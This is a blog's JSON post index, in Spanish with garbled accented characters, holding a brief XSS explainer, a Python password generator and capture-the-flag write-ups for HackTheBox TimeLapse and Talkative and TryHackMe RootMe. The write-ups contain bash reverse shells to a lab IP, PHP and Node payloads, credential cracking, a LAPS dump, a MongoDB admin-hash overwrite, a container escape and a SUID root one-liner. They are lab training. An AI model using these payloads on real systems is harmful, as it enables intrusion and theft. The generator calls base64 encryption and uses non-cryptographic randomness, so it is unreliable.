[ { "title": "Cross-site scripting", "url": "/posts/xss/", "categories": "XSS, blogging", "tags": "XSS, blogging", "date": "2022-08-30 18:00:00 +0200", "snippet": "¬øQu√© es un ataque XSS?Un ataque XSS o tambi√©n conocido como ataque cross-site scripting es un tipo de ataque que es muy com√∫n en aplicaciones web, el atacante injecta un script malicioso en una web normal y el servidor interpreta el c√≥digo y puede cuando otro usuario entre a esa secci√≥n de la aplicaci√≥n web.Tipos de XSS1-Reflected XSSEl XSS reflejado o reflected XSS se produce cuando una aplicaci√≥n web devuelve la entrada de usuario en forma de mensaje de error, en algunos casos los datos proporcionados por el usuario sean del navegador.2-Stored XSSEl Stored XSS o XSS almacenado se produce cuando el c√≥digo malicioso se guarda en el servidor de alguna forma, puede ser en la base de datos, en los logins etc, el c√≥digo ser√° ejecutado por el navegador de la v√≠ctima al entrar a la secci√≥n infectada de la aplicaci√≥n web, este tipo de XSS tambi√©n es conocido como Type-I XSS.3-DOM XSSSe da cuando el c√≥digo malicioso se inyecta mediante una URL pero la web no contiene el c√≥digo en su c√≥digo fuente, el c√≥digo sale de la propia URL que crea el atacante y el servidor lo ejecuta, este tipo de XSS tambi√©n se conoce como Type-II XSS.Imagenes de: ImpervaInformaci√≥n de: OWASP" }, { "title": "TimeLapse hackthebox writeup", "url": "/posts/timelapse/", "categories": "Hackthebox, machine, writeup", "tags": "Hackthebox, writeup", "date": "2022-08-30 18:00:00 +0200", "snippet": "Empezamos con el escaneo de puertos sobre la m√°quinaNmap scan report for 10.10.11.152PORT STATE SERVICE53/tcp open domain88/tcp open kerberos-sec135/tcp open msrpc139/tcp open netbios-ssn389/tcp open ldap445/tcp open microsoft-ds464/tcp open kpasswd5593/tcp open http-rpc-epmap636/tcp open ldapssl3268/tcp open globalcatLDAP3269/tcp open globalcatLDAPssl5986/tcp open wsmans9389/tcp open adwsC√≥mo vemos que est√° el servicio SMB habilitado vamos a empezar a enumerar‚ùØ smbclient -L 10.10.11.152Enter WORKGROUP\\root's password:\tSharename Type Comment\t--------- ---- -------\tADMIN$ Disk Remote Admin\tC$ Disk Default share\tIPC$ IPC Remote IPC\tShares Disk Dentro de Shares/Dev/ hay un archivo zip, podemos descargarlo con smbmap con el par√°metro ‚Äìdownload o con la consola interactiva de smbclientEl zip tiene una contrase√±a, la podemos crackear con johnjohn --wordlist=/usr/share/wordlists/rockyou.txt hashzipAl descomprimir el zip se puede ver un archivo .pfx que se puede usar para extraer un certificado y conectarse a la m√°quina por winrm‚ùØ lshashzip legacyy_dev_auth.pfx pfxhash winrm_backup.zip‚ùØ john --wordlist=/usr/share/wordlists/rockyou.txt pfxhashthuglegacy (legacyy_dev_auth.pfx)openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.keyopenssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.crtAhora con los siguientes par√°metros nos podemos conectar por evil-winrm-c: certificate-k key-S: SSL mode‚ùØ evil-winrm -S -i 10.10.11.152 -c crt -k keyEnter PEM pass phrase: thuglegacyPS C:\\Users\\legacyy\\Desktop&gt; type user.txt********************************Al ejecutar WinPeas podemos ver que hay un archivo de historial que podemos leer, en este tipo de archivos podemos encontrar contrase√±asC:\\Users\\legacyy\\AppData\\Roaming\\Microsoft\\Windows\\Powershell\\PSReadLine\\ConsoleHost_history.txtEfectivamente encontramos una contrase√±a para el usuario svc_deploy, con esto podr√≠amos conectarnos contra la administraci√≥n remota de windows ya que el usuario pertenece a remote management users$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)El usuario pertenece al grupo LAPS Readers que nos permite algunas cosas interesantesPodemos usar crackmapexec, LAPSDumper y otras herramientas para intentar crear una contrase√±a temporal para el usuario Administrator, en este caso voy a usar LAPSDumper python3 laps.py -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -d timelapse.htbEsto nos devuelve directamente el nombre del DC y su contrase√±a temporal en texto claroCon eso ya solo queda conectarnos por winrm con √±as credenciales obtenidas, en este caso tenemos que usar el par√°metro -S para poner el modo SSL ya que el puerto 5986 tiene wsmans en lugar de wsman‚ùØ evil-winrm -S -i 10.10.11.152 -u Administrator -p 'temporal_password'PS C:\\Users\\TRX/Desktop&gt; type root.txt********************************Y con esto terminamos la m√°quina TimeLapse." }, { "title": "C√≥mo crear una contrase√±a segura con Python", "url": "/posts/python-password/", "categories": "Python, Password", "tags": "Password, security", "date": "2022-08-30 18:00:00 +0200", "snippet": "C√≥mo crear una contrase√±a segura con python¬øQu√© es python?Python es un lenguaje de programaci√≥n usado para aplicaciones de todo tipo, entre ellas se encuentran: aplicaciones web, aplicaciones de escritorio y gr√°ficas, aplicaciones de terminal. Se usa mucho para automatizar acciones es un lenguaje de programaci√≥n multiparadigma, ya que soporta parcialmente la programaci√≥n orientada a objetos.¬øQu√© tiene que tener una contrase√±a segura?Para que tu contrase√±a sea segura tiene que tener m√°s de 15 caracteres, entre ellos debe haber: Caracteres especiales (#$%&amp;) N√∫meros (254) Letras (abc) May√∫sculas y min√∫sculasTambi√©n es importante: Que no sea una palabra Que no est√© relaccionada contigo Que no se repita en otras cuentasC√≥mo hacer una contrase√±a segura con PythonEste es un ejemplo de como hacer una contrase√±a segura con Python:import base64from random import choicechars = 'qwertyuiopasdfghjklzzxcvbnmdfg'nums = '1230983655645987'chars_uppercase = chars.upper()specials = '!$%&amp;'all = chars_uppercase+nums+chars+specialspass_gen = ''.join( choice(all) for i in range(60))encoded_pass = (base64.b64encode(pass_gen.encode('ascii')))encoded_ascii = encoded_pass.decode('ascii')print(encoded_ascii)Explicaci√≥n del c√≥digoEmpezamos importando las librer√≠as, para este proyecto solo se necesita el m√≥dulo choice de la librer√≠a random y la librer√≠a base64.Despu√©s creamos las variables principales que vamos a usar, en este caso son: chars (caracteres), nums (n√∫meros), specials (caracteres especiales), es importante que los caracteres sean aleatorios para una mayor seguridad.Lo siguiente es crear una variable que mezcle todas las variables anteriores, para crear una sola.Despu√©s creamos la variable password y meteremos el c√≥digo para crear la contrase√±a de forma aleatoria, en mi c√≥digo puse 50 porque quiero 50 d√≠gitos en mi contrase√±a, esto se puede cambiar.Lo siguiente es encriptar la contrase√±a, yo us√© base64 pero la librer√≠a base64 incluye base16, base58, base32‚Ä¶, por √∫ltimo imprimimos la contrase√±a por consola para ver el resultado final.Lo de convertirlo a base64 es opcional, esto evade completamente los simbolos especiales, si quieres los simbolos simplemente usa este c√≥digo:from random import choicechars = 'qwertyuiopasdfghjklzzxcvbnmdfg'nums = '1230983655645987'chars_uppercase = chars.upper()specials = '!$%&amp;'all = chars_uppercase+nums+chars+specialspass_gen = ''.join( choice(all) for i in range(60))print(pass_gen)" }, { "title": "Talkative hackthebox writeup", "url": "/posts/talkative-writeup/", "categories": "Hackthebox, machine, writeup", "tags": "Hackthebox, writeup", "date": "2022-08-29 18:00:00 +0200", "snippet": "Empezamos con el escaneo de nmap sobre los puertos de la m√°quina‚ùØ sudo nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.11.155 -oG allPortsScanning 10.10.11.155 [65535 ports]Discovered open port 8080/tcp on 10.10.11.155Discovered open port 80/tcp on 10.10.11.155Discovered open port 8081/tcp on 10.10.11.155Discovered open port 3000/tcp on 10.10.11.155Discovered open port 8082/tcp on 10.10.11.155Nmap scan report for 10.10.11.155PORT STATE SERVICE REASON80/tcp open http syn-ack ttl 623000/tcp open ppp syn-ack ttl 628080/tcp open http-proxy syn-ack ttl 628081/tcp open blackice-icecap syn-ack ttl 628082/tcp open blackice-alerts syn-ack ttl 62Explicaci√≥n: -sS: TCP SYN port scan -p-: todo el rango de puertos (0-65535) --open: filtrar por puertos con status open --min-rate 5000: que envie como m√≠nimo 5000 por segundo -vvv: para que te reporte los puertos abiertos antes de que termine el escaneo -n: para que no te aplique resoluci√≥n DNS -Pn: para que no te aplique resoluci√≥n de hosts atrav√©s del protocolo de resoluci√≥n de direcciones (ARP) -oG: para que te exporte la informaci√≥n en formato grepeableComo est√° el puerto 80 abierto podemos ir directamente a la web pero nos redirige a un dominio, esto lo podemos comprobar con curl‚ùØ curl 10.10.11.155&lt;html&gt;&lt;head&gt;&lt;title&gt;301 Moved Permanently&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Moved Permanently&lt;/h1&gt;&lt;p&gt;The document has moved &lt;a href=\"http://talkative.htb\"&gt;here&lt;/a&gt;.&lt;/p&gt;&lt;hr&gt;&lt;/body&gt;&lt;/html&gt;En el puerto 80 no encontramos nada interesante, podemos ir al puerto 8080 a ver su contenidoPodemos ver que hay una aplicaci√≥n de Hoja de c√°lculo normal, tenemos disponible un editor que nos permite ejecutar c√≥digo, vamos a intentar ejecutar una reverse shell, ya que esta web ejecuta c√≥digo PHPEn este caso voy a usar esta reverse shell:system('bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.14.75/1234 0&gt;&amp;1\"')Nos llega una reverse shell de un contenedor, no podemos entrar desde aqu√≠ a la m√°quina real pero podemos revisar los archivos de la m√°quina‚ùØ sudo nc -lvnp 1234listening on [any] 1234 ...connect to [10.10.14.75] from (UNKNOWN) [10.10.11.155] 45940root@b06821bbda78:/# whoamiwhoamirootroot@b06821bbda78:/# hostname -Ihostname -I172.18.0.2 root@b06821bbda78:/#Encontramos el archivo /root/bolt-administration.omv, no tenemos nada dentro de la m√°quina para poder descargar este archivo en nuestra m√°quina, podemos usar pwncat-cs para descargarlo directamente cuando nos llega la reverse shellUna vez descargado podemos ver que contiene usuarios y contrase√±as, creamos una expresi√≥n regular para poder filtrar por los que nos interesa, finalmente quedar√≠a as√≠:mattjanitsauljeO09ufhWD&lt;sbZ89h}V&lt;S_DA)SQWGm&gt;9KHEAHaciendo Fuzzing sobre el dominio podemos encontrar el directorio bolt que contiene una p√°gina de inicio de sesi√≥n, podemos probar las crendenciales que hemos encontrado anteriormente a ver si las reutilizan aqu√≠El usuario admin funciona con la contrase√±a jeO09ufhWD&lt;s , as√≠ que iniciamos sesi√≥n con las credencialesUna vez iniciada la sesi√≥n podemos ver un apartado de configuraci√≥n, dentro hay un apartado llamado All Configuration Files, vamos a ver su contenidoPodemos ver un archivo llamado Bundle.php , como la web interpreta PHP podemos usar la reverse shell anterior para meternos a la m√°quina&lt;?php\tsystem('bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.14.75/1234 0&gt;&amp;1\"')?&gt;Nos ponemos en escucha con Netcat y nos llega una reverse shell como www-data en un contenedor‚ùØ sudo nc -lvnp 1234listening on [any] 1234 ...connect to [10.10.14.75] from (UNKNOWN) [10.10.11.155] 57846www-data@b922262b694b:/var/www/talkative.htb/bolt/public$ hostname -Ihostname -I172.17.0.15 Esto no nos da mucha informaci√≥n, podemos probar las credenciales encontradas anteriormente por SSH desde el propio contenedorwww-data@b922262b694b:/var/www/talkative.htb/bolt/public$ ssh saul@172.17.0.1Are you sure you want to continue connecting (yes/no/[fingerprint])? yessaul@172.17.0.1 password: jeO09ufhWD&lt;ssaul@talkative:~$ whoamisaulsaul@talkative:~$ cat user.txt cd8c******cb258c950d9edcc065Con pspy descubrimos este procesoCMD: UID=0 PID=4894 | /bin/sh -c python3 /root/.backup/update_mongo.pyEl cual es un script que actualiza la base de datos mongo, el puerto de mongo est√° abiero as√≠ que podemos tunelizar la conexi√≥n para poder conectarnos a la base de datos remotamentesaul@talkative:~$ netstat -nattcp 0 0 172.17.0.1:43752 172.17.0.2:27017 TIME_WAITCon chisel tunelizamos la conexi√≥n hacia nuestra m√°quinaM√°quina atacante:‚ùØ chisel server --reverse --port 80002022/08/30 17:21:20 server: Reverse tunnelling enabled2022/08/30 17:21:20 server: Fingerprint 4iFocLbXWmRvOoiAYCwK9t8TfvcH6MJOSR1ngLYhgoM=2022/08/30 17:21:20 server: Listening on http://0.0.0.0:8000M√°quina v√≠ctima:saul@talkative:~$ ./chisel client 10.10.14.75:8000 R:27017:172.17.0.2:270172022/08/30 15:25:37 client: Connecting to ws://10.10.14.75:80002022/08/30 15:25:37 client: Connected (Latency 38.916105ms)Ahora podemos intentar conectarnos a mongoDB e intentar cambiar la contrase√±a del usuario administrador de la webrs0 [direct: primary] test&gt; show databasesadmin 104.00 KiBconfig 124.00 KiBlocal 11.69 MiBmeteor 4.91 MiBrs0 [direct: primary] test&gt; use meteorswitched to db meteorrs0 [direct: primary] meteor&gt; db.getCollection('users').update({username:\"admin\"}, { $set: {\"services\" : { \"password\" : {\"bcrypt\" : \"$2a$10$n9CM8OgInDlwpvjLKLPML.eizXIzLlRtgCh3GRLafOdR9ldAUh/KG\" } } } }){ acknowledged: true, insertedId: null, matchedCount: 1, modifiedCount: 1, upsertedCount: 0}Ahora como tenemos tunelizada la conexi√≥n tenemos que meternos por el puerto 8000 el cual est√° abierto en la m√°quina a la que nos estamos conectando con ChiselPodemos ir al apartado de Administraci√≥n&gt;integraciones para crear una nueva integraci√≥nNueva integraci√≥n&gt;WebHook entranteHabilitado: VerdaderoNomb: ShellCanal: #generalPublicar como: adminscript habilitado: verdaderoVamos a usar la primera l√≠nea de este exploit , finalmente queda algo as√≠const require = console.log.constructor('return process.mainModule.require')();require('child_process').exec('bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.14.75/1234 0&gt;&amp;1\"');Lo guardamos y hacemos un curl a la URL del webhook con el token que nos pone en la integraci√≥n que hemos creado‚ùØ curl http://talkative.htb:3000/hooks/hA7ZNgGYHtRhpYBjH/CsNw6amXPMXR4PH9SANT7cyrFaDwhMpLNiiCwHzX9gCfwXcc{\"success\":false}Aunque ponga false nos llega la reverse shell, seguimos en un contenedor y no podemos descargar archivos de la m√°quina desde dentro‚ùØ nc -lvnp 1234listening on [any] 1234 ...connect to [10.10.14.75] from (UNKNOWN) [10.10.11.155] 57468root@c150397ccd63:/app/bundle/programs/server# hostname -Ihostname -I172.17.0.3Ahora con pwncat-cs nos ponemos en escucha, ejecutamos el comando de curl de antes y con cdk leemos archivos de la m√°quina real, podemos leer directamente la flag.‚ùØ pwncat-cs -lp 1234[17:41:55] Welcome to pwncat üêà! (local) pwncat$ upload cdk /root/cdk/root/cdk[17:42:12] uploaded 11.91MiB in 6.67 seconds (local) pwncat$ back(remote) root@c150397ccd63:/app/bundle/programs/server# cd /root(remote) root@c150397ccd63:/root# chmod +x cdk (remote) root@c150397ccd63:/root# ./cdk run cap-dac-read-search /root/root.txt Running with target: /root/root.txt, ref: /etc/hostname57ebcfafa23a47da6507a95d1307beff(remote) root@c150397ccd63:/root#Con esto terminamos la m√°quina Talkative." }, { "title": "RootMe Tryhackme writeup", "url": "/posts/rootme-writeup/", "categories": "Tryhackme, machine, writeup", "tags": "tryhackme, writeup", "date": "2022-08-27 18:00:00 +0200", "snippet": "Para empezar hacemos un escaneo para ver los puertos abiertos de la m√°quina:Como veo que est√°n los puertos 22 (SSH) y 80 (HTTP) voy a hacer un escaneo sobre esos dos puertos con los scripts b√°sicos de reconocimiento que aplica Nmap:Vamos a revisar el contenido de la web de el puerto 80:No vemos nada en el c√≥digo fuente as√≠ que vamos a enumerar directorios con gobuster:Vemos el directorio Uploads y el directorio Panel, vamos a revisar el Panel:Se ve que podemos subir archivos, yo probar√© con php ya que es lo que interpreta el servidor:No nos permite subirlo, vamos a probar con la extensi√≥n phtml que tambi√©n interpreta php:Nos ha dejado subirlo, podemos aprovechar para subir una reverse shell e ir al directorio uploads para comprobar la subida:Al ver que se ha subido lo √∫nico que tenemos que hacer es ponernos en escucha con netcat y dar click en el archivo desde el directorio uploads:Nos ha llegado la reverse shell as√≠ que lo siguiente es tratarla:script /dev/null -c bashCtrl + Zstty raw -echo; fgreset xtermexport TERM=xtermexport SHELL=bashLo siguiente es encontrar la flag de usuario, no est√° en ‚Äú/home/rootme/user.txt‚Äù ni en ‚Äú/home/test/user.txt‚Äù as√≠ que vamos a revisar en ‚Äú/var/www‚Äù:Vamos a ver si existen binarios SUID con propietario root:Vemos que el binario de Python tiene permisos SUID as√≠ que lo buscamos en GTFObins:python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'Encontramos un oneliner que nos da una shell de root as√≠ que lo probamos:Y con eso terminamos la m√°quina RootMe." } ]
